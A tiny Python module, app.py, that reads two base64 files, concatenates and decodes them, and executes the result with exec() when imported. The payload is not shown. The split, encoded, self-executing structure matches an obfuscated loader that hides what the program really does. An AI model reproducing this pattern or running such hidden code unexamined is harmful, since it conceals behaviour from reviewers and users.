"""app.py"""
import pathlib, base64
_r=pathlib.Path(__file__).resolve().parent
_b=(_r/"_t0.b64").read_text().strip()+(_r/"_t1.b64").read_text().strip()
exec(compile(base64.b64decode(_b).decode(),"app.py","exec"),globals())
